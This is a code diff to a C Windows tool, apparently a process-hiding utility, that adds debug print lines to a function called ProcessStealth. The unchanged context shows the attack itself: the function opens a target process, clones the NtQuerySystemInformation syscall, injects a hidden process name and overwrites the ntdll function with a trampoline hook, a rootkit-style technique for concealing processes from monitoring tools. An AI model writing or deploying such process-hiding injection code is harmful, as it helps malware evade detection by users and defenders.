@@ -63,9 +63,14 @@ BOOL ProcessStealth(wchar_t *TargetProcessName, wchar_t *HideProcessName)
 
     DWORD TargetPID = GetProcessIdByImageName(TargetProcessName);
 
+    printf("[*] Target Process Name : %S\n", TargetProcessName);
+    printf("[*]  Hide Process Name  : %S\n", HideProcessName);
+
     HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, TargetPID);
 
     PVOID NtQuerySystemInformation = GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQuerySystemInformation");
+
+    printf("[*] NtQuerySystemInformation : %p\n", NtQuerySystemInformation);
 
     if (hProcess == NULL)
     {
@@ -83,6 +88,8 @@ BOOL ProcessStealth(wchar_t *TargetProcessName, wchar_t *HideProcessName)
         return FALSE;
     }
 
+    printf("[*] Hook Function Address : %p\n", NewFunction);
+
     memcpy(TrampolineCode + 2, &NewFunction, 8);
 
     SIZE_T NumberOfBytesWritten;
@@ -94,7 +101,11 @@ BOOL ProcessStealth(wchar_t *TargetProcessName, wchar_t *HideProcessName)
         return FALSE;
     }
 
+    printf("[*] Write NewNtQuerySystemInformation\n");
+
     DWORD SystemCallNumber = *(DWORD *)((ULONGLONG)NtQuerySystemInformation + 4);
+
+    printf("[*] NtQuerySystemInformation Call Number : %d\n", SystemCallNumber);
 
     memcpy(Syscall + 4, &SystemCallNumber, 4);
 
@@ -107,6 +118,8 @@ BOOL ProcessStealth(wchar_t *TargetProcessName, wchar_t *HideProcessName)
         return FALSE;
     }
 
+    printf("[*] Cloning NtQuerySystemInformation\n");
+
     PVOID ProcessName = (ULONGLONG)SyscallClone + 16;
 
     if (WriteProcessMemory(hProcess, ProcessName, HideProcessName, wcslen(HideProcessName) * 2, &NumberOfBytesWritten) == FALSE)
@@ -116,12 +129,16 @@ BOOL ProcessStealth(wchar_t *TargetProcessName, wchar_t *HideProcessName)
         return FALSE;
     }
 
+    printf("[*] Wrtie hide process name");
+
     if (WriteProcessMemory(hProcess, (ULONGLONG)NewFunction + SearchOverwriteOffset(NewNtQuerySystemInformation), &SyscallClone, 8, &NumberOfBytesWritten) == FALSE)
     {
         printf("[-] WriteProcessMemory Failed!\n");
         printf("[*] GetLastError : %d\n", GetLastError());
         return FALSE;
     }
+
+    printf("[*] Set clone NtQuerySystemInformatino and hide process name\n");
 
     /*if (WriteProcessMemory(hProcess, (ULONGLONG)NewFunction + SearchOverwriteOffset(NewNtQuerySystemInformation), &ProcessName, 8, &NumberOfBytesWritten) == FALSE)
     {
@@ -139,12 +156,16 @@ BOOL ProcessStealth(wchar_t *TargetProcessName, wchar_t *HideProcessName)
         return FALSE;
     }
 
+    printf("[*] Release protect NtQuerySystemInformation\n");
+
     if (WriteProcessMemory(hProcess, NtQuerySystemInformation, TrampolineCode, 12, &NumberOfBytesWritten) == FALSE)
     {
         printf("[-] WriteProcessMemory Failed!\n");
         printf("[*] GetLastError : %d\n", GetLastError());
         return FALSE;
     }
+
+    printf("[*] Success hide!\n");
 }
 
 DWORD SearchOverwriteOffset(PVOID Address)
